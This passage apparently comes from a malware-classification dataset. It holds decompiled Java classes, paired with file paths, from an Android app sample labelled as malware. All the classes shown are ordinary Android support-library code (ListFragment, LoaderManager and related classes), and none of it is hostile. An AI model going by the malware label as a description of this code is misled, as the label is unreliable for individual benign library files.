  if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationIcon(this.mCallingPackage);     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve icon for calling application"",e);       return null;     }   }   public CharSequence getCallingApplicationLabel(){     if (this.mCallingPackage == null) {       return null;     }     PackageManager pm=this.mActivity.getPackageManager();     try {       return pm.getApplicationLabel(pm.getApplicationInfo(this.mCallingPackage,0));     }  catch (    PackageManager.NameNotFoundException e) {       Log.e(TAG,""Could not retrieve label for calling application"",e);       return null;     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\ListFragment.code","public class ListFragment extends Fragment {   static final int INTERNAL_EMPTY_ID=16711681;   static final int INTERNAL_LIST_CONTAINER_ID=16711683;   static final int INTERNAL_PROGRESS_CONTAINER_ID=16711682;   ListAdapter mAdapter;   CharSequence mEmptyText;   View mEmptyView;   ListView mList;   View mListContainer;   boolean mListShown;   View mProgressContainer;   TextView mStandardEmptyView;   private final Handler mHandler=new Handler();   private final Runnable mRequestFocus=new Runnable(){     @Override public void run(){       ListFragment.this.mList.focusableViewAvailable(ListFragment.this.mList);     }   } ;   private final AdapterView.OnItemClickListener mOnClickListener=new AdapterView.OnItemClickListener(){     @Override public void onItemClick(    AdapterView<?> parent,    View v,    int position,    long id){       ListFragment.this.onListItemClick((ListView)parent,v,position,id);     }   } ;   @Override public View onCreateView(  LayoutInflater inflater,  ViewGroup container,  Bundle savedInstanceState){     Context context=getActivity();     FrameLayout frameLayout=new FrameLayout(context);     LinearLayout pframe=new LinearLayout(context);     pframe.setId(INTERNAL_PROGRESS_CONTAINER_ID);     pframe.setOrientation(1);     pframe.setVisibility(8);     pframe.setGravity(17);     ProgressBar progress=new ProgressBar(context,null,R.attr.progressBarStyleLarge);     pframe.addView(progress,new FrameLayout.LayoutParams(-2,-2));     frameLayout.addView(pframe,new FrameLayout.LayoutParams(-1,-1));     FrameLayout lframe=new FrameLayout(context);     lframe.setId(INTERNAL_LIST_CONTAINER_ID);     TextView tv=new TextView(getActivity());     tv.setId(INTERNAL_EMPTY_ID);     tv.setGravity(17);     lframe.addView(tv,new FrameLayout.LayoutParams(-1,-1));     ListView lv=new ListView(getActivity());     lv.setId(R.id.list);     lv.setDrawSelectorOnTop(false);     lframe.addView(lv,new FrameLayout.LayoutParams(-1,-1));     frameLayout.addView(lframe,new FrameLayout.LayoutParams(-1,-1));     frameLayout.setLayoutParams(new FrameLayout.LayoutParams(-1,-1));     return frameLayout;   }   @Override public void onViewCreated(  View view,  Bundle savedInstanceState){     super.onViewCreated(view,savedInstanceState);     ensureList();   }   @Override public void onDestroyView(){     this.mHandler.removeCallbacks(this.mRequestFocus);     this.mList=null;     this.mListShown=false;     this.mListContainer=null;     this.mProgressContainer=null;     this.mEmptyView=null;     this.mStandardEmptyView=null;     super.onDestroyView();   }   public void onListItemClick(  ListView l,  View v,  int position,  long id){   }   public void setListAdapter(  ListAdapter adapter){     boolean hadAdapter=this.mAdapter != null;     this.mAdapter=adapter;     if (this.mList != null) {       this.mList.setAdapter(adapter);       if (!this.mListShown && !hadAdapter) {         setListShown(true,getView().getWindowToken() != null);       }     }   }   public void setSelection(  int position){     ensureList();     this.mList.setSelection(position);   }   public int getSelectedItemPosition(){     ensureList();     return this.mList.getSelectedItemPosition();   }   public long getSelectedItemId(){     ensureList();     return this.mList.getSelectedItemId();   }   public ListView getListView(){     ensureList();     return this.mList;   }   public void setEmptyText(  CharSequence text){     ensureList();     if (this.mStandardEmptyView == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     this.mStandardEmptyView.setText(text);     if (this.mEmptyText == null) {       this.mList.setEmptyView(this.mStandardEmptyView);     }     this.mEmptyText=text;   }   public void setListShown(  boolean shown){     setListShown(shown,true);   }   public void setListShownNoAnimation(  boolean shown){     setListShown(shown,false);   }   private void setListShown(  boolean shown,  boolean animate){     ensureList();     if (this.mProgressContainer == null) {       throw new IllegalStateException(""Can't be used with a custom content view"");     }     if (this.mListShown != shown) {       this.mListShown=shown;       if (shown) {         if (animate) {           this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));           this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         }  else {           this.mProgressContainer.clearAnimation();           this.mListContainer.clearAnimation();         }         this.mProgressContainer.setVisibility(8);         this.mListContainer.setVisibility(0);         return;       }       if (animate) {         this.mProgressContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_in));         this.mListContainer.startAnimation(AnimationUtils.loadAnimation(getActivity(),R.anim.fade_out));       }  else {         this.mProgressContainer.clearAnimation();         this.mListContainer.clearAnimation();       }       this.mProgressContainer.setVisibility(0);       this.mListContainer.setVisibility(8);     }   }   public ListAdapter getListAdapter(){     return this.mAdapter;   }   private void ensureList(){     if (this.mList == null) {       View root=getView();       if (root == null) {         throw new IllegalStateException(""Content view not yet created"");       }       if (root instanceof ListView) {         this.mList=(ListView)root;       }  else {         this.mStandardEmptyView=(TextView)root.findViewById(INTERNAL_EMPTY_ID);         if (this.mStandardEmptyView == null) {           this.mEmptyView=root.findViewById(R.id.empty);         }  else {           this.mStandardEmptyView.setVisibility(8);         }         this.mProgressContainer=root.findViewById(INTERNAL_PROGRESS_CONTAINER_ID);         this.mListContainer=root.findViewById(INTERNAL_LIST_CONTAINER_ID);         View rawListView=root.findViewById(R.id.list);         if (!(rawListView instanceof ListView)) {           if (rawListView == null) {             throw new RuntimeException(""Your content must have a ListView whose id attribute is 'android.R.id.list'"");           }           throw new RuntimeException(""Content has view with id attribute 'android.R.id.list' that is not a ListView class"");         }         this.mList=(ListView)rawListView;         if (this.mEmptyView != null) {           this.mList.setEmptyView(this.mEmptyView);         }  else         if (this.mEmptyText != null) {           this.mStandardEmptyView.setText(this.mEmptyText);           this.mList.setEmptyView(this.mStandardEmptyView);         }       }       this.mListShown=true;       this.mList.setOnItemClickListener(this.mOnClickListener);       if (this.mAdapter != null) {         ListAdapter adapter=this.mAdapter;         this.mAdapter=null;         setListAdapter(adapter);       }  else       if (this.mProgressContainer != null) {         setListShown(false,false);       }       this.mHandler.post(this.mRequestFocus);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\LoaderCallbacks.code","public interface LoaderCallbacks<D> {   Loader<D> onCreateLoader(  int i,  Bundle bundle);   void onLoadFinished(  Loader<D> loader,  D d);   void onLoaderReset(  Loader<D> loader); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\LoaderInfo.code","public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {   final Bundle mArgs;   LoaderManager.LoaderCallbacks<Object> mCallbacks;   Object mData;   boolean mDeliveredData;   boolean mDestroyed;   boolean mHaveData;   final int mId;   boolean mListenerRegistered;   Loader<Object> mLoader;   LoaderInfo mPendingLoader;   boolean mReportNextStart;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   public LoaderInfo(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callbacks){     this.mId=id;     this.mArgs=args;     this.mCallbacks=callbacks;   }   void start(){     if (this.mRetaining && this.mRetainingStarted) {       this.mStarted=true;       return;     }     if (!this.mStarted) {       this.mStarted=true;       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);       }       if (this.mLoader == null && this.mCallbacks != null) {         this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);       }       if (this.mLoader != null) {         if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {           throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);         }         if (!this.mListenerRegistered) {           this.mLoader.registerListener(this.mId,this);           this.mListenerRegistered=true;         }         this.mLoader.startLoading();       }     }   }   void retain(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);     }     this.mRetaining=true;     this.mRetainingStarted=this.mStarted;     this.mStarted=false;     this.mCallbacks=null;   }   void finishRetain(){     if (this.mRetaining) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);       }       this.mRetaining=false;       if (this.mStarted != this.mRetainingStarted && !this.mStarted) {         stop();       }     }     if (this.mStarted && this.mHaveData && !this.mReportNextStart) {       callOnLoadFinished(this.mLoader,this.mData);     }   }   void reportStart(){     if (this.mStarted && this.mReportNextStart) {       this.mReportNextStart=false;       if (this.mHaveData) {         callOnLoadFinished(this.mLoader,this.mData);       }     }   }   void stop(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);     }     this.mStarted=false;     if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {       this.mListenerRegistered=false;       this.mLoader.unregisterListener(this);       this.mLoader.stopLoading();     }   }   void destroy(){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);     }     this.mDestroyed=true;     boolean needReset=this.mDeliveredData;     this.mDeliveredData=false;     if (this.mCallbacks != null && this.mLoader != null && this.mHaveData && needReset) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);       }       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";       }       try {         this.mCallbacks.onLoaderReset(this.mLoader);       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }     this.mCallbacks=null;     this.mData=null;     this.mHaveData=false;     if (this.mLoader != null) {       if (this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);       }       this.mLoader.reset();     }     if (this.mPendingLoader != null) {       this.mPendingLoader.destroy();     }   }   @Override public void onLoadComplete(  Loader<Object> loader,  Object data){     if (LoaderManagerImpl.DEBUG) {       Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);     }     if (this.mDestroyed) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");         return;       }       return;     }     if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");         return;       }       return;     }     LoaderInfo pending=this.mPendingLoader;     if (pending != null) {       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);       }       this.mPendingLoader=null;       LoaderManagerImpl.this.mLoaders.put(this.mId,null);       destroy();       LoaderManagerImpl.this.installLoader(pending);       return;     }     if (this.mData != data || !this.mHaveData) {       this.mData=data;       this.mHaveData=true;       if (this.mStarted) {         callOnLoadFinished(loader,data);       }     }     LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);     if (info != null && info != this) {       info.mDeliveredData=false;       info.destroy();       LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);     }     if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {       LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();     }   }   void callOnLoadFinished(  Loader<Object> loader,  Object data){     if (this.mCallbacks != null) {       String lastBecause=null;       if (LoaderManagerImpl.this.mActivity != null) {         lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;         LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";       }       try {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));         }         this.mCallbacks.onLoadFinished(loader,data);         this.mDeliveredData=true;       }   finally {         if (LoaderManagerImpl.this.mActivity != null) {           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;         }       }     }   }   public String toString(){     StringBuilder sb=new StringBuilder(64);     sb.append(""LoaderInfo{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" #"");     sb.append(this.mId);     sb.append("" : "");     DebugUtils.buildShortClassTag(this.mLoader,sb);     sb.append(""}}"");     return sb.toString();   }   public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     writer.print(prefix);     writer.print(""mId="");     writer.print(this.mId);     writer.print("" mArgs="");     writer.println(this.mArgs);     writer.print(prefix);     writer.print(""mCallbacks="");     writer.println(this.mCallbacks);     writer.print(prefix);     writer.print(""mLoader="");     writer.println(this.mLoader);     if (this.mLoader != null) {       this.mLoader.dump(prefix + ""  "",fd,writer,args);     }     if (this.mHaveData || this.mDeliveredData) {       writer.print(prefix);       writer.print(""mHaveData="");       writer.print(this.mHaveData);       writer.print(""  mDeliveredData="");       writer.println(this.mDeliveredData);       writer.print(prefix);       writer.print(""mData="");       writer.println(this.mData);     }     writer.print(prefix);     writer.print(""mStarted="");     writer.print(this.mStarted);     writer.print("" mReportNextStart="");     writer.print(this.mReportNextStart);     writer.print("" mDestroyed="");     writer.println(this.mDestroyed);     writer.print(prefix);     writer.print(""mRetaining="");     writer.print(this.mRetaining);     writer.print("" mRetainingStarted="");     writer.print(this.mRetainingStarted);     writer.print("" mListenerRegistered="");     writer.println(this.mListenerRegistered);     if (this.mPendingLoader != null) {       writer.print(prefix);       writer.println(""Pending Loader "");       writer.print(this.mPendingLoader);       writer.println("":"");       this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);     }   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\LoaderManager.code","public abstract class LoaderManager { public interface LoaderCallbacks<D> {     Loader<D> onCreateLoader(    int i,    Bundle bundle);     void onLoadFinished(    Loader<D> loader,    D d);     void onLoaderReset(    Loader<D> loader);   }   public abstract void destroyLoader(  int i);   public abstract void dump(  String str,  FileDescriptor fileDescriptor,  PrintWriter printWriter,  String[] strArr);   public abstract <D>Loader<D> getLoader(  int i);   public abstract <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public abstract <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderCallbacks<D> loaderCallbacks);   public static void enableDebugLogging(  boolean enabled){     LoaderManagerImpl.DEBUG=enabled;   }   public boolean hasRunningLoaders(){     return false;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\android.support.v4.app\LoaderManagerImpl.code","public class LoaderManagerImpl extends LoaderManager {   static boolean DEBUG=false;   static final String TAG=""LoaderManager"";   FragmentActivity mActivity;   boolean mCreatingLoader;   boolean mRetaining;   boolean mRetainingStarted;   boolean mStarted;   final String mWho;   final SparseArrayCompat<LoaderInfo> mLoaders=new SparseArrayCompat<>();   final SparseArrayCompat<LoaderInfo> mInactiveLoaders=new SparseArrayCompat<>(); public final class LoaderInfo implements Loader.OnLoadCompleteListener<Object> {     final Bundle mArgs;     LoaderManager.LoaderCallbacks<Object> mCallbacks;     Object mData;     boolean mDeliveredData;     boolean mDestroyed;     boolean mHaveData;     final int mId;     boolean mListenerRegistered;     Loader<Object> mLoader;     LoaderInfo mPendingLoader;     boolean mReportNextStart;     boolean mRetaining;     boolean mRetainingStarted;     boolean mStarted;     public LoaderInfo(    int id,    Bundle args,    LoaderManager.LoaderCallbacks<Object> callbacks){       this.mId=id;       this.mArgs=args;       this.mCallbacks=callbacks;     }     void start(){       if (this.mRetaining && this.mRetainingStarted) {         this.mStarted=true;         return;       }       if (!this.mStarted) {         this.mStarted=true;         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Starting: "" + this);         }         if (this.mLoader == null && this.mCallbacks != null) {           this.mLoader=this.mCallbacks.onCreateLoader(this.mId,this.mArgs);         }         if (this.mLoader != null) {           if (this.mLoader.getClass().isMemberClass() && !Modifier.isStatic(this.mLoader.getClass().getModifiers())) {             throw new IllegalArgumentException(""Object returned from onCreateLoader must not be a non-static inner member class: "" + this.mLoader);           }           if (!this.mListenerRegistered) {             this.mLoader.registerListener(this.mId,this);             this.mListenerRegistered=true;           }           this.mLoader.startLoading();         }       }     }     void retain(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Retaining: "" + this);       }       this.mRetaining=true;       this.mRetainingStarted=this.mStarted;       this.mStarted=false;       this.mCallbacks=null;     }     void finishRetain(){       if (this.mRetaining) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Finished Retaining: "" + this);         }         this.mRetaining=false;         if (this.mStarted != this.mRetainingStarted && !this.mStarted) {           stop();         }       }       if (this.mStarted && this.mHaveData && !this.mReportNextStart) {         callOnLoadFinished(this.mLoader,this.mData);       }     }     void reportStart(){       if (this.mStarted && this.mReportNextStart) {         this.mReportNextStart=false;         if (this.mHaveData) {           callOnLoadFinished(this.mLoader,this.mData);         }       }     }     void stop(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Stopping: "" + this);       }       this.mStarted=false;       if (!this.mRetaining && this.mLoader != null && this.mListenerRegistered) {         this.mListenerRegistered=false;         this.mLoader.unregisterListener(this);         this.mLoader.stopLoading();       }     }     void destroy(){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""  Destroying: "" + this);       }       this.mDestroyed=true;       boolean needReset=this.mDeliveredData;       this.mDeliveredData=false;       if (this.mCallbacks != null && this.mLoader != null && this.mHaveData && needReset) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Reseting: "" + this);         }         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoaderReset"";         }         try {           this.mCallbacks.onLoaderReset(this.mLoader);         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }       this.mCallbacks=null;       this.mData=null;       this.mHaveData=false;       if (this.mLoader != null) {         if (this.mListenerRegistered) {           this.mListenerRegistered=false;           this.mLoader.unregisterListener(this);         }         this.mLoader.reset();       }       if (this.mPendingLoader != null) {         this.mPendingLoader.destroy();       }     }     @Override public void onLoadComplete(    Loader<Object> loader,    Object data){       if (LoaderManagerImpl.DEBUG) {         Log.v(LoaderManagerImpl.TAG,""onLoadComplete: "" + this);       }       if (this.mDestroyed) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- destroyed"");           return;         }         return;       }       if (LoaderManagerImpl.this.mLoaders.get(this.mId) != this) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Ignoring load complete -- not active"");           return;         }         return;       }       LoaderInfo pending=this.mPendingLoader;       if (pending != null) {         if (LoaderManagerImpl.DEBUG) {           Log.v(LoaderManagerImpl.TAG,""  Switching to pending loader: "" + pending);         }         this.mPendingLoader=null;         LoaderManagerImpl.this.mLoaders.put(this.mId,null);         destroy();         LoaderManagerImpl.this.installLoader(pending);         return;       }       if (this.mData != data || !this.mHaveData) {         this.mData=data;         this.mHaveData=true;         if (this.mStarted) {           callOnLoadFinished(loader,data);         }       }       LoaderInfo info=LoaderManagerImpl.this.mInactiveLoaders.get(this.mId);       if (info != null && info != this) {         info.mDeliveredData=false;         info.destroy();         LoaderManagerImpl.this.mInactiveLoaders.remove(this.mId);       }       if (LoaderManagerImpl.this.mActivity != null && !LoaderManagerImpl.this.hasRunningLoaders()) {         LoaderManagerImpl.this.mActivity.mFragments.startPendingDeferredFragments();       }     }     void callOnLoadFinished(    Loader<Object> loader,    Object data){       if (this.mCallbacks != null) {         String lastBecause=null;         if (LoaderManagerImpl.this.mActivity != null) {           lastBecause=LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause;           LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=""onLoadFinished"";         }         try {           if (LoaderManagerImpl.DEBUG) {             Log.v(LoaderManagerImpl.TAG,""  onLoadFinished in "" + loader + "": ""+ loader.dataToString(data));           }           this.mCallbacks.onLoadFinished(loader,data);           this.mDeliveredData=true;         }   finally {           if (LoaderManagerImpl.this.mActivity != null) {             LoaderManagerImpl.this.mActivity.mFragments.mNoTransactionsBecause=lastBecause;           }         }       }     }     public String toString(){       StringBuilder sb=new StringBuilder(64);       sb.append(""LoaderInfo{"");       sb.append(Integer.toHexString(System.identityHashCode(this)));       sb.append("" #"");       sb.append(this.mId);       sb.append("" : "");       DebugUtils.buildShortClassTag(this.mLoader,sb);       sb.append(""}}"");       return sb.toString();     }     public void dump(    String prefix,    FileDescriptor fd,    PrintWriter writer,    String[] args){       writer.print(prefix);       writer.print(""mId="");       writer.print(this.mId);       writer.print("" mArgs="");       writer.println(this.mArgs);       writer.print(prefix);       writer.print(""mCallbacks="");       writer.println(this.mCallbacks);       writer.print(prefix);       writer.print(""mLoader="");       writer.println(this.mLoader);       if (this.mLoader != null) {         this.mLoader.dump(prefix + ""  "",fd,writer,args);       }       if (this.mHaveData || this.mDeliveredData) {         writer.print(prefix);         writer.print(""mHaveData="");         writer.print(this.mHaveData);         writer.print(""  mDeliveredData="");         writer.println(this.mDeliveredData);         writer.print(prefix);         writer.print(""mData="");         writer.println(this.mData);       }       writer.print(prefix);       writer.print(""mStarted="");       writer.print(this.mStarted);       writer.print("" mReportNextStart="");       writer.print(this.mReportNextStart);       writer.print("" mDestroyed="");       writer.println(this.mDestroyed);       writer.print(prefix);       writer.print(""mRetaining="");       writer.print(this.mRetaining);       writer.print("" mRetainingStarted="");       writer.print(this.mRetainingStarted);       writer.print("" mListenerRegistered="");       writer.println(this.mListenerRegistered);       if (this.mPendingLoader != null) {         writer.print(prefix);         writer.println(""Pending Loader "");         writer.print(this.mPendingLoader);         writer.println("":"");         this.mPendingLoader.dump(prefix + ""  "",fd,writer,args);       }     }   }   public LoaderManagerImpl(  String who,  FragmentActivity activity,  boolean started){     this.mWho=who;     this.mActivity=activity;     this.mStarted=started;   }   public void updateActivity(  FragmentActivity activity){     this.mActivity=activity;   }   private LoaderInfo createLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     LoaderInfo info=new LoaderInfo(id,args,callback);     Loader<Object> loader=callback.onCreateLoader(id,args);     info.mLoader=loader;     return info;   }   private LoaderInfo createAndInstallLoader(  int id,  Bundle args,  LoaderManager.LoaderCallbacks<Object> callback){     try {       this.mCreatingLoader=true;       LoaderInfo info=createLoader(id,args,callback);       installLoader(info);       return info;     }   finally {       this.mCreatingLoader=false;     }   }   void installLoader(  LoaderInfo info){     this.mLoaders.put(info.mId,info);     if (this.mStarted) {       info.start();     }   }   @Override public <D>Loader<D> initLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""initLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo == null) {       loaderInfo=createAndInstallLoader(i,bundle,loaderCallbacks);       if (DEBUG) {         Log.v(TAG,""  Created new loader "" + loaderInfo);       }     }  else {       if (DEBUG) {         Log.v(TAG,""  Re-using existing loader "" + loaderInfo);       }       loaderInfo.mCallbacks=loaderCallbacks;     }     if (loaderInfo.mHaveData && this.mStarted) {       loaderInfo.callOnLoadFinished(loaderInfo.mLoader,loaderInfo.mData);     }     return (Loader<D>)loaderInfo.mLoader;   }   @Override public <D>Loader<D> restartLoader(  int i,  Bundle bundle,  LoaderManager.LoaderCallbacks<D> loaderCallbacks){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (DEBUG) {       Log.v(TAG,""restartLoader in "" + this + "": args=""+ bundle);     }     if (loaderInfo != null) {       LoaderInfo loaderInfo2=this.mInactiveLoaders.get(i);       if (loaderInfo2 != null) {         if (loaderInfo.mHaveData) {           if (DEBUG) {             Log.v(TAG,""  Removing last inactive loader: "" + loaderInfo);           }           loaderInfo2.mDeliveredData=false;           loaderInfo2.destroy();           loaderInfo.mLoader.abandon();           this.mInactiveLoaders.put(i,loaderInfo);         }  else         if (!loaderInfo.mStarted) {           if (DEBUG) {             Log.v(TAG,""  Current loader is stopped; replacing"");           }           this.mLoaders.put(i,null);           loaderInfo.destroy();         }  else {           if (loaderInfo.mPendingLoader != null) {             if (DEBUG) {               Log.v(TAG,""  Removing pending loader: "" + loaderInfo.mPendingLoader);             }             loaderInfo.mPendingLoader.destroy();             loaderInfo.mPendingLoader=null;           }           if (DEBUG) {             Log.v(TAG,""  Enqueuing as new pending loader"");           }           loaderInfo.mPendingLoader=createLoader(i,bundle,loaderCallbacks);           return (Loader<D>)loaderInfo.mPendingLoader.mLoader;         }       }  else {         if (DEBUG) {           Log.v(TAG,""  Making last loader inactive: "" + loaderInfo);         }         loaderInfo.mLoader.abandon();         this.mInactiveLoaders.put(i,loaderInfo);       }     }     return (Loader<D>)createAndInstallLoader(i,bundle,loaderCallbacks).mLoader;   }   @Override public void destroyLoader(  int id){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     if (DEBUG) {       Log.v(TAG,""destroyLoader in "" + this + "" of ""+ id);     }     int idx=this.mLoaders.indexOfKey(id);     if (idx >= 0) {       LoaderInfo info=this.mLoaders.valueAt(idx);       this.mLoaders.removeAt(idx);       info.destroy();     }     int idx2=this.mInactiveLoaders.indexOfKey(id);     if (idx2 >= 0) {       LoaderInfo info2=this.mInactiveLoaders.valueAt(idx2);       this.mInactiveLoaders.removeAt(idx2);       info2.destroy();     }     if (this.mActivity != null && !hasRunningLoaders()) {       this.mActivity.mFragments.startPendingDeferredFragments();     }   }   @Override public <D>Loader<D> getLoader(  int i){     if (this.mCreatingLoader) {       throw new IllegalStateException(""Called while creating a loader"");     }     LoaderInfo loaderInfo=this.mLoaders.get(i);     if (loaderInfo != null) {       if (loaderInfo.mPendingLoader != null) {         return (Loader<D>)loaderInfo.mPendingLoader.mLoader;       }       return (Loader<D>)loaderInfo.mLoader;     }     return null;   }   public void doStart(){     if (DEBUG) {       Log.v(TAG,""Starting in "" + this);     }     if (this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStart when already started: "" + this,e);     }  else {       this.mStarted=true;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).start();       }     }   }   public void doStop(){     if (DEBUG) {       Log.v(TAG,""Stopping in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doStop when not started: "" + this,e);     }  else {       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).stop();       }       this.mStarted=false;     }   }   public void doRetain(){     if (DEBUG) {       Log.v(TAG,""Retaining in "" + this);     }     if (!this.mStarted) {       RuntimeException e=new RuntimeException(""here"");       e.fillInStackTrace();       Log.w(TAG,""Called doRetain when not started: "" + this,e);     }  else {       this.mRetaining=true;       this.mStarted=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).retain();       }     }   }   public void finishRetain(){     if (this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Finished Retaining in "" + this);       }       this.mRetaining=false;       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).finishRetain();       }     }   }   public void doReportNextStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).mReportNextStart=true;     }   }   public void doReportStart(){     for (int i=this.mLoaders.size() - 1; i >= 0; i--) {       this.mLoaders.valueAt(i).reportStart();     }   }   public void doDestroy(){     if (!this.mRetaining) {       if (DEBUG) {         Log.v(TAG,""Destroying Active in "" + this);       }       for (int i=this.mLoaders.size() - 1; i >= 0; i--) {         this.mLoaders.valueAt(i).destroy();       }       this.mLoaders.clear();     }     if (DEBUG) {       Log.v(TAG,""Destroying Inactive in "" + this);     }     for (int i2=this.mInactiveLoaders.size() - 1; i2 >= 0; i2--) {       this.mInactiveLoaders.valueAt(i2).destroy();     }     this.mInactiveLoaders.clear();   }   public String toString(){     StringBuilder sb=new StringBuilder(128);     sb.append(""LoaderManager{"");     sb.append(Integer.toHexString(System.identityHashCode(this)));     sb.append("" in "");     DebugUtils.buildShortClassTag(this.mActivity,sb);     sb.append(""}}"");     return sb.toString();   }   @Override public void dump(  String prefix,  FileDescriptor fd,  PrintWriter writer,  String[] args){     if (this.mLoaders.size() > 0) {       writer.print(prefix);       writer.println(""Active Loaders:"");       String innerPrefix=prefix + ""    "";       for (int i=0; i < this.mLoaders.size(); i++) {         LoaderInfo li=this.mLoaders.valueAt(i);         writer.print(prefix);         writer.print(""  #"");         writer.print(this.mLoaders.keyAt(i));         writer.print("": 